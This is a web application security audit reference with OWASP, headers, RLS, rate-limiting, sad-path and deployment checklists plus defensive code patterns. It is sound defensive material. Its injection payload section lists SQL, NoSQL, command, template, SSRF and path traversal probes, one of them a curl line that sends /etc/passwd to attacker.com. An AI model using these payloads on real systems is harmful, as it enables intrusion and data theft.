# Attack Vector Reference

Use this file for the OWASP Top 10 checklist, sad-path testing guide, security headers audit, RLS coverage table, rate limiting matrix, and file upload security checklist.

---

## OWASP Top 10 Checklist

Run this for every audit. Mark ✅ (protected), ❌ (vulnerable), or N/A.

| #   | Vulnerability                 | Check                                                        | Status |
| --- | ----------------------------- | ------------------------------------------------------------ | ------ |
| A01 | **Broken Access Control**     | Every route has auth check + ownership check                 |        |
| A01 |                               | No IDOR — object IDs filtered by user_id server-side         |        |
| A01 |                               | Admin routes require role verification server-side           |        |
| A01 |                               | No forced browsing to sensitive paths                        |        |
| A02 | **Cryptographic Failures**    | No secrets in client bundle or source code                   |        |
| A02 |                               | Passwords hashed with bcrypt/argon2/scrypt (not MD5/SHA1)    |        |
| A02 |                               | JWTs use strong algorithm (RS256 or HS256 with long secret)  |        |
| A02 |                               | HTTPS enforced — no HTTP fallback in production              |        |
| A02 |                               | Sensitive data encrypted at rest                             |        |
| A03 | **Injection**                 | All DB queries parameterized (no string concatenation)       |        |
| A03 |                               | NoSQL queries sanitized                                      |        |
| A03 |                               | No shell command execution with user input                   |        |
| A03 |                               | Template engines auto-escape by default                      |        |
| A03 |                               | CSV/formula injection prevented in exports                   |        |
| A04 | **Insecure Design**           | Payment amounts recalculated server-side                     |        |
| A04 |                               | Business logic enforced server-side (coupons, limits, roles) |        |
| A04 |                               | Password reset tokens single-use and expire after use        |        |
| A04 |                               | Checkout workflow resistant to partial-failure state         |        |
| A05 | **Security Misconfiguration** | Debug mode off in production                                 |        |
| A05 |                               | Error responses don't leak stack traces or internals         |        |
| A05 |                               | Admin routes not publicly accessible                         |        |
| A05 |                               | S3/Supabase Storage buckets not publicly readable            |        |
| A05 |                               | Default credentials changed                                  |        |
| A06 | **Vulnerable Components**     | No critical CVEs in npm/pip dependencies                     |        |
| A06 |                               | No abandoned packages with known exploits                    |        |
| A06 |                               | Package lock file committed and used in CI                   |        |
| A07 | **Auth Failures**             | Generic error messages (no email enumeration)                |        |
| A07 |                               | Brute force protection on login + reset endpoints            |        |
| A07 |                               | Session tokens rotate after login                            |        |
| A07 |                               | Sessions invalidated on logout server-side                   |        |
| A07 |                               | Refresh tokens rotated on use                                |        |
| A08 | **Integrity Failures**        | Webhook signatures verified before processing                |        |
| A08 |                               | Unsafe deserialization not present                           |        |
| A08 |                               | CI/CD secrets not accessible to PRs from forks               |        |
| A09 | **Logging & Monitoring**      | Auth failures logged                                         |        |
| A09 |                               | Payment events logged                                        |        |
| A09 |                               | Admin actions logged                                         |        |
| A09 |                               | Sensitive data (passwords, tokens) NOT logged                |        |
| A10 | **SSRF**                      | Server-side fetch URLs validated against allowlist           |        |
| A10 |                               | Webhook callback URLs validated (no internal IPs)            |        |
| A10 |                               | Image/URL fetch endpoints not open proxies                   |        |

---

## Security Headers Checklist

Check HTTP response headers on all routes. Mark ✅/❌.

| Header                      | Required Value                                               | Status | Risk if Missing         |
| --------------------------- | ------------------------------------------------------------ | ------ | ----------------------- |
| `Content-Security-Policy`   | Restrictive policy, no `unsafe-inline` where avoidable       |        | XSS escalation          |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains`                        |        | SSL stripping           |
| `X-Frame-Options`           | `DENY` or `SAMEORIGIN`                                       |        | Clickjacking            |
| `X-Content-Type-Options`    | `nosniff`                                                    |        | MIME sniffing attacks   |
| `Referrer-Policy`           | `strict-origin-when-cross-origin`                            |        | Sensitive URL leakage   |
| `Permissions-Policy`        | Restrict camera, mic, geolocation                            |        | Feature abuse           |
| `CORS`                      | Explicit origin allowlist, not `*` for credentialed requests |        | Cross-origin data theft |
| `Cache-Control`             | `no-store` on auth/sensitive routes                          |        | Browser cache exposure  |

**Quick check (curl):**

```bash
curl -I https://yourapp.com/api/me
curl -I https://yourapp.com/login
```

---

## RLS / Database Permission Layer Checklist

Run for all apps using Supabase, PostgreSQL RLS, Firebase Rules, or Hasura.

| #     | Check                                                     | Status |
| ----- | --------------------------------------------------------- | ------ |
| RLS1  | RLS enabled on all tables containing user data            |        |
| RLS2  | Policies enforce `auth.uid() = user_id` on SELECT         |        |
| RLS3  | Policies enforce `auth.uid() = user_id` on UPDATE/DELETE  |        |
| RLS4  | No `USING (true)` policy on sensitive tables              |        |
| RLS5  | No public SELECT policy on user-data tables               |        |
| RLS6  | Anon key cannot query orders, profiles, documents tables  |        |
| RLS7  | service_role key used ONLY server-side, never in client   |        |
| RLS8  | Multi-tenant data isolated by tenant_id at policy level   |        |
| RLS9  | Admin access uses service_role via server API, not client |        |
| RLS10 | RLS tested via direct Supabase client queries in devtools |        |

**Test RLS manually:**

```js
// Run in browser console on your app:
const { data } = await supabase.from("orders").select("*");
console.log(data); // Should return ONLY current user's orders, or null
```

---

## Rate Limiting Coverage Matrix

Mark each endpoint category with its protection status.

| Endpoint Category          | Rate Limit              | Lockout           | CAPTCHA  | Status |
| -------------------------- | ----------------------- | ----------------- | -------- | ------ |
| POST /auth/login           | 5 req/15min per IP      | After 10 failures | Optional |        |
| POST /auth/signup          | 3 req/hour per IP       | —                 | On abuse |        |
| POST /auth/forgot-password | 3 req/hour per IP/email | —                 | —        |        |
| POST /auth/verify-otp      | 5 req/15min             | After 5 failures  | —        |        |
| POST /checkout             | 10 req/hour per user    | —                 | —        |        |
| POST /api/ai/\*            | 20 req/min per user     | —                 | —        |        |
| GET /api/search            | 60 req/min per IP       | —                 | —        |        |
| POST /api/upload           | 10 req/hour per user    | —                 | —        |        |
| POST /api/webhooks/\*      | Allowlist by IP         | —                 | —        |        |
| Admin routes               | Per-admin audit log     | —                 | —        |        |

**Recommended implementation (Upstash):**

```ts
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "15 m"),
});

export async function middleware(request: NextRequest) {
  const ip = request.ip ?? "127.0.0.1";
  const { success } = await ratelimit.limit(ip);
  if (!success)
    return NextResponse.json({ error: "Too many requests" }, { status: 429 });
}
```

---

## Sad-Path Test Matrix

For every multi-step workflow, verify behavior at each failure point.

### Checkout / Payment Workflow

| Step                 | Failure Scenario                       | Expected Behavior                                   | Risk if Unhandled  |
| -------------------- | -------------------------------------- | --------------------------------------------------- | ------------------ |
| 1. Cart created      | Item goes out of stock before checkout | Block purchase, show error                          | Oversell           |
| 2. Payment initiated | User closes browser mid-payment        | Order remains in `pending`, not `paid`              | Orphaned order     |
| 3. Payment succeeds  | Order creation DB write fails          | Payment captured, no order — needs idempotent retry | Financial loss     |
| 3. Webhook fires     | Webhook fires twice (Razorpay retry)   | Second webhook is idempotent no-op                  | Double fulfillment |
| 4. Fulfillment       | Fulfillment API is down                | Queue retry, don't mark as failed immediately       | Silent failure     |
| Any                  | Concurrent checkout of last item       | Only one succeeds — use DB transaction + lock       | Race condition     |

**Idempotency pattern:**

```ts
// Store processed webhook IDs to prevent duplicate processing
const existing = await db.query(
  "SELECT id FROM processed_webhooks WHERE webhook_id = $1",
  [webhookId],
);
if (existing.rows.length > 0) return Response.json({ ok: true }); // Already processed

// Process + record atomically
await db.transaction(async (tx) => {
  await fulfillOrder(tx, orderId);
  await tx.query("INSERT INTO processed_webhooks (webhook_id) VALUES ($1)", [
    webhookId,
  ]);
});
```

---

### Auth Workflow Sad Paths

| Scenario                             | Expected Behavior                                          |
| ------------------------------------ | ---------------------------------------------------------- |
| Login with nonexistent email         | Generic: "Invalid credentials" — no email enumeration      |
| Login with wrong password            | Same generic message, same response time                   |
| 10+ failed login attempts            | Account locked for 15 minutes, alert sent to user          |
| Password reset for nonexistent email | "If registered, you'll receive an email" — no confirmation |
| Reusing expired reset token          | 404 or generic invalid token error                         |
| Reusing already-used reset token     | Token invalidated on first use — second use rejected       |
| Session token used after logout      | Server-side invalidation — 401 returned                    |
| JWT with tampered payload            | Signature check fails — 401 returned                       |
| Concurrent sessions                  | Policy decision: allow or invalidate older sessions        |

---

### File Upload Sad Paths

| Attack Vector           | What to Test                              | Expected Behavior                                              |
| ----------------------- | ----------------------------------------- | -------------------------------------------------------------- |
| MIME spoofing           | Upload `shell.php` renamed to `shell.jpg` | Server checks actual MIME, not extension                       |
| Script upload           | Upload HTML/JS file                       | Blocked or stored with forced download headers                 |
| SVG injection           | Upload SVG with embedded `<script>`       | SVG sanitized or served as `application/octet-stream`          |
| Oversized file          | Upload 1GB file                           | Rejected before fully received (size header + streaming limit) |
| ZIP bomb                | Upload tiny ZIP that expands to gigabytes | Expansion limit enforced                                       |
| EXIF payload            | Image with malicious EXIF data            | EXIF stripped before storage                                   |
| Path traversal          | Filename: `../../etc/passwd`              | Filename sanitized — never used directly in file system path   |
| Stored XSS via filename | Filename: `<script>alert(1)</script>.jpg` | Filename HTML-encoded in all display contexts                  |

**File validation pattern:**

```ts
import { fileTypeFromBuffer } from "file-type";

const buffer = await file.arrayBuffer();
const type = await fileTypeFromBuffer(Buffer.from(buffer));

const ALLOWED_TYPES = [
  "image/jpeg",
  "image/png",
  "image/webp",
  "application/pdf",
];

if (!type || !ALLOWED_TYPES.includes(type.mime)) {
  return Response.json({ error: "Invalid file type" }, { status: 400 });
}

// Never use user-provided filename in storage path
const safeName = `${crypto.randomUUID()}.${type.ext}`;
```

---

## Business Logic Attack Patterns

Test these against any app with coupons, referrals, free trials, inventory, or pricing:

| Attack              | Description                                 | Test                                               |
| ------------------- | ------------------------------------------- | -------------------------------------------------- |
| Coupon stacking     | Apply multiple coupons to one order         | Server enforces 1 coupon per order                 |
| Coupon reuse        | Reuse a single-use coupon                   | DB marks coupon as used atomically                 |
| Referral self-abuse | User refers themselves with second account  | Detect same device/IP/email pattern                |
| Free trial repeat   | Cancel + re-signup for infinite free trials | Trial tied to payment method fingerprint or email  |
| Negative price      | Send negative item quantity                 | Server validates quantity > 0                      |
| Race — last item    | Two users buy last item simultaneously      | DB-level lock or atomic decrement with check       |
| Price override      | Send custom price in request body           | Server ignores client price, recalculates from DB  |
| Discount escalation | Apply staff discount code found via fuzzing | Coupon codes cryptographically unguessable         |
| Review bombing      | Submit 1000 reviews from one account        | Rate limit + account age gate on review submission |

---

## Injection Payload Reference

Use these payloads when reviewing input handling. The app must handle all gracefully.

### SQL Injection Probes

```
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT email, password, null FROM users --
1; SELECT pg_sleep(5) --
```

### NoSQL Injection (MongoDB)

```json
{ "username": { "$gt": "" }, "password": { "$gt": "" } }
{ "email": { "$regex": ".*" } }
```

### Command Injection

```
; cat /etc/passwd
| whoami
&& curl http://attacker.com/?data=$(cat /etc/passwd)
```

### Template Injection

```
{{7*7}}          → Jinja2/Twig: returns 49
${7*7}           → Freemarker
<%= 7*7 %>       → ERB
```

### SSRF Probes

```
http://169.254.169.254/latest/meta-data/    (AWS metadata)
http://localhost:5432                        (internal Postgres)
http://internal-admin.yourapp.com
file:///etc/passwd
```

### Path Traversal

```
../../etc/passwd
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
```

---

## Deployment Security Checklist

| #   | Check                                                       | Status |
| --- | ----------------------------------------------------------- | ------ |
| D1  | `.env` not committed to git (in `.gitignore`)               |        |
| D2  | No secrets in `NEXT_PUBLIC_` variables                      |        |
| D3  | Source maps disabled in production build                    |        |
| D4  | Debug/verbose error mode off in production                  |        |
| D5  | Admin routes behind authentication + role check             |        |
| D6  | S3/Supabase Storage buckets not publicly listable           |        |
| D7  | Database not publicly accessible (VPC/firewall)             |        |
| D8  | Docker image does not run as root                           |        |
| D9  | `NODE_ENV=production` set in deployment                     |        |
| D10 | Dependency audit run in CI (`npm audit --audit-level=high`) |        |
| D11 | Secrets rotated after any suspected exposure                |        |
| D12 | Build logs don't print secret values                        |        |
